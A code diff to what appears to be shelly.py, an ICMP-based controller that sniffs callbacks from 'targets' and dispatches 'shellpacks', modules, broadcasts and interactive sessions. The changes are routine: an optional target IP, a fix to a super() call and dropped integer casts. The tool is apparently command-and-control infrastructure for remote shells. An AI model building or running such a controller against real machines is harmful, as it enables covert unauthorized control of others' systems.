@@ -44,14 +44,17 @@ class Controller(Host):
     Sniff callback responses
     """
 
-    def sniffing(self, target_ip: str) -> None:
+    def sniffing(self, target_ip: str | None = None) -> None:
         """
         Special controller sniffer
         
         Similar to the sniffer in shlib, but filters to be only the specified target
         """
 
-        sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
+        if target_ip:
+            sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
+        else:
+            sniff(iface=self.iface, prn=self.sniff_callback, filter=f"icmp", store="0")
 
     def instruction(self, shellpack: dict) -> None:
         """
@@ -183,7 +186,7 @@ class Controller(Host):
         
         if verbose:
             # Starts a sniffer to get a callback with the super sniffer because I don't want only current IP
-            sniffer = Process(target=super.sniffing, args=(target['ip'],))
+            sniffer = Process(target=Host.sniffing, args=(target['ip'],))
             sniffer.start()
 
         # Checks to see if module exists then runs through all targets
@@ -288,19 +291,19 @@ def main():
         case "ls":
             print(controller.list_info())
         case "rm":
-            controller.rm_target(int(args.target))
+            controller.rm_target(args.target)
         case "interact":
             if args.target == "all":
                 parser.error(f"The command {args.command} can only take one target")
-            controller.interact(int(args.target))
+            controller.interact(args.target)
         case "run":
             if args.module is None:
                 parser.error(f"The command {args.command} requires you to declare a module\nModules can be found by running shelly.py ls")
-            controller.run(int(args.target), args.module, args.verbose)
+            controller.run(args.target, args.module, args.verbose)
         case "broadcast":
             if args.message is None:
                 parser.error(f"The command {args.command} requires you to declare a message")
-            controller.broadcast(int(args.target), args.message)
+            controller.broadcast(args.target, args.message)
         case "connect":
             controller.connect()
 
